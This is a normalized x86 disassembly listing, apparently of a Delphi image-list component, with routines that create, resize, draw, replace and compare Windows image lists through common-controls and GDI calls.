mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_423640
mov eax ebx
call sub_422ac0
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d9c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412f04
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_422ac0
pop edx
call sub_41dda0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f858
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44f874
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44f7b0
pop ecx
pop edx
pop ebx
retn
sub_44f8ac
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44f79c
test al al
je r-xdata
mov eax esi
call sub_44ff6c
mov eax esi
call sub_44f7b0
mov eax esi
mov si 0xffef
call sub_403540
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44f8f0
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_44f79c
test al al
je r-xdata
mov eax esi
call sub_44ff6c
mov eax esi
call sub_44f7b0
mov eax esi
mov si 0xffef
call sub_403540
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44f934
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f9d4
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44f874
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_403540
sub_44f980
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_450554
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_422b2c
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44f9d4
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_403540
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44f970
push eax
call ImageList_Destroy
sub_44fa0c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44fa9f
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44f79c
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44faa6
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov edx eax
mov eax ebx
call sub_44ff78
sub_44faac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44fb5b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44fb3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44f7a4
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f980
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f980
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fb45
mov eax [ ebp - 0x10 ]
call sub_403344
retn
sub_44fb78
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44fc77
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f980
push eax
mov eax [ ebp - 0x4 ]
call sub_44f970
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fc7e
mov eax [ ebp - 0xc ]
call sub_403344
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44fc39
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_4239e4
mov eax [ ebp - 0x4 ]
call sub_44f7a4
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44f960
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f980
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403344
retn
sub_44fc94
push ebx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44f970
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44fcb8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44fecf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44f79c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fed6
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4040b8
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_450554
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44fb78
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
xor eax eax
push ebp
push sub_44fe80
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44fe60
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44fe43
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_423890
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0xc ]
call sub_422ac0
call sub_41e234
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f970
push eax
call ImageList_Draw
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
call sub_422ac0
call sub_41e234
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f970
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x64 ]
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_44f970
push eax
call ImageList_Replace
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fe4a
mov eax [ ebp - 0x10 ]
call sub_403344
retn
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
sub_44fee0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44ff5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44fc94
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44f79c
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
mov eax ebx
mov si 0xffef
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ff66
lea eax [ ebp - 0x4 ]
call sub_404094
retn
push esi
mov eax ebx
call sub_44f970
push eax
call ImageList_Remove
sub_44ff78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44f598
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_403540
pop esi
pop ebx
retn
sub_44ffb0
push ebx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44f970
push eax
call ImageList_GetBkColor
call sub_44f5b8
pop ebx
retn
sub_44ffd8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44f598
push eax
mov eax ebx
call sub_44ffb0
call sub_44f598
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_41e234
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44f970
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_422ac0
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_41d9c8
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_412f04
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_422ac0
pop edx
call sub_41dda0
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_422ac0
call sub_41e234
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44f970
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_412f04
mov eax [ ebx + 0x54 ]
call sub_422ac0
call sub_41e234
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_41d9c8
mov eax edi
call sub_41e234
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_41d9c8
mov eax edi
call sub_41e234
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_423890
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
sub_4501ac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov bl [ eax + 0x40 ]
push ebx
mov bl [ eax + 0x43 ]
push ebx
mov bl [ ebp + 0x8 ]
push ebx
call sub_4501d0
pop ebx
pop ebp
retn 0xc
sub_4501d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f79c
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
xor eax eax
mov al [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_45021c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412f04
mov eax [ ebp - 0x4 ]
call sub_450eb0
xor eax eax
push ebp
push sub_4503b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_450398
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_45037b
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_423890
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450382
mov eax [ ebp - 0x10 ]
call sub_403344
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_422ac0
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_41dda0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_41e234
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_422ac0
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_41dda0
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_41e234
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44faac
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_4503c4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44f970
mov edx eax
or ecx 0xffffffff
mov eax ebx
call sub_45021c
sub_4503e4
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax ebx
call sub_44f9d4
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4149b4
mov eax ebx
call sub_44ff6c
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4505cc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax esi
call sub_44f970
mov edx eax
mov eax ebx
call sub_44f874
mov eax ebx
call sub_44f79c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44f970
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44f7a4
jmp r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44f970
push eax
call ImageList_GetBkColor
call sub_44f5b8
mov edx eax
mov eax ebx
call sub_44ff78
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov edx esi
mov eax ebx
call sub_4503c4
jmp r-xdata
sub_4504a4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_414a98
pop esi
pop ebx
retn
mov al [ esi + 0x41 ]
mov [ ebx + 0x41 ] al
mov al [ esi + 0x43 ]
mov [ ebx + 0x43 ] al
mov dl [ esi + 0x40 ]
mov eax ebx
call sub_4505cc
mov al [ esi + 0x42 ]
mov [ ebx + 0x42 ] al
mov eax [ esi + 0x48 ]
mov [ ebx + 0x48 ] eax
mov eax ebx
call sub_44ff6c
mov eax esi
call sub_44f970
mov edx eax
mov eax ebx
call sub_44f874
mov eax ebx
call sub_44f79c
test al al
jne r-xdata
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax ebx
call sub_44f970
push eax
call ImageList_SetIconSize
mov eax ebx
call sub_44f7a4
jmp r-xdata
mov eax esi
call sub_44f970
push eax
call ImageList_GetBkColor
call sub_44f5b8
mov edx eax
mov eax ebx
call sub_44ff78
mov edx esi
mov eax ebx
call sub_4503c4
pop esi
pop ebx
retn
sub_450554
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4505c0
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4505c7
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ ebx + 0x30 ]
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcbc
call sub_403ad0
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
cmp eax [ ebx + 0x34 ]
jge r-xdata
sub_4505f4
push ebx
push esi
push edi
push ebp
mov ebx eax
mov [ ebx + 0x58 ] 0x1
cmp [ ebx + 0x5c ] 0x0
jg r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x4c ]
call sub_4143bc
mov si 0xffff
call sub_403540
inc ebp
dec edi
jne r-xdata
sub_450644
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
xor eax eax
mov [ ebp + 0x4 ] eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_41425c
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4143bc
cmp ebp eax
jne r-xdata
sub_45069c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_407f58
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4506e0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi edx
mov esi eax
test edi edi
je r-xdata
mov [ ebp - 0x1 ] 0x0
jmp r-xdata
mov eax esi
call sub_44fc94
mov ebx eax
mov eax edi
call sub_44fc94
cmp ebx eax
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_44fc94
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4507bc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45079f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_45069c
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4507a6
mov eax [ ebp - 0xc ]
call sub_403344
retn
mov eax edi
call sub_44fc94
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_4507d0
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_44fc94
test eax eax
setg al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4506e0
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_45082c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a128
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x38 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x3c ]
push eax
push ebp
call sub_4507d0
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_450884
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax ebx
call sub_41627c
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax ebx
call sub_41627c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_450b08
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416050
mov esi eax
mov edx ebx
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov eax [ ebp - 0x18 ]
add eax esi
cdq
push edx
push eax
mov eax ebx
call sub_416070
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_450aeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4224f8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_423890
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_412f04
mov eax [ ebp - 0x4 ]
call sub_450eb0
xor eax eax
